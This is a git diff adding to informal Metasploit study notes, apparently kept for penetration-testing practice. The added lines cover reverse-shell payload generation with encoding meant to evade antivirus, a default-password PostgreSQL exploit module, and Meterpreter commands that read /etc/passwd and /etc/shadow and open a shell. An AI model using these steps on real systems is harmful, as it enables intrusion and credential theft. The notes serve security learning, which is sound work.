@@ -41,6 +41,8 @@ Step -
       > help generate // generate a payload for certain laungages such as java, python and many more
       > help workspace
       > db_status // to see running DB
+      > db_connect -y /usr/share/metasploit-framework/config/database.yml
+      > db_export , db_loot etc // look into then using like "db_export -h"
       > use gather/search_email_collector // to start working in search_email_collector auxillary(module)
       > show options // it will list the inputs needed to execute this module
       > show targets // for the particular exploits to know on what type they will work
@@ -54,7 +56,8 @@ Step -
       o/p - list the emails associated with the target
       
       // stager tries to stage a connection between the kali or metasploit instance and the victim machine so it tries to make the
-      connection as the part of the exploit
+      connection as the part of the exploit, this u can see in below meterpreter scenerio as on connection it would be show as
+      'stage' connection to target
       
       - Options ->
       - use payload/windows/shell/reverse_tcp
@@ -69,10 +72,40 @@ Step -
       the generated shell code for payload is a problem as it is detectable
       - generate -b \x00\xff  // list the hex characters to remove to avoid by anti virus but their is a limit to the shell code
       could get removed from the payload
-      - generate -e x86/shikata_ga_nai -i 3 -t bash // -e to use encoding on the payload, -i to use the iterations of encoding as
-      more the iterations more difficult for the anti-virus to detect the payload, -t is for the language for the code or payload
+      - generate -e x86/shikata_ga_nai -i 3 -f bash // -e to use encoding on the payload, -i to use the iterations of encoding as
+      more the iterations more difficult for the anti-virus to detect the payload, -f is for the language for the code or payload
       to work here we r doing bash
-      - workspace -a workspace_name 
+      - workspace // to check list of workspaces
+      - workspace -a workspace_name // add workspace
+      - services // lists the host and databases
+      - hosts -h
+      - hosts -c address,os_flavour // to show data regarding these columns 
+      - creds  // to see credentials 
+      
+      // meterprter is a payload which once is on the target gives the shell for remote system, it exists on the memory of the
+      target system so it gives lot of stealth option as well
+      
+      Scenria in which we know that the default password is selected for the target in postgresql DB
+      - workspace
+      - search postgres
+      - use exploit/linux/postgres/postgres_payload
+      - setg RHOSTS ip
+      - set PASSWORD password // this is set by doing the reconnaissance or could be alreday mentioned in exploit
+      - show advanced
+      - show targets
+      - exploit
+      meterpreter > help // to see the options could be run in meterpreter session
+      		  > background // this will put a session in the back ground then return to it
+		  > sessions // to see active sessions
+		  > sessions -h
+		  > sessions -i session_id
+		  > cat /etc/passwd // if u get into the system
+		  > cat /etc/shadow
+		  > shell // to get the shell on target
+		  	> id 
+			> exit
+		  > 
+      			
       
 Step - Footprinting phase allows the attacker to gather the information regarding internal and external security architecture, he 
        has to face a target
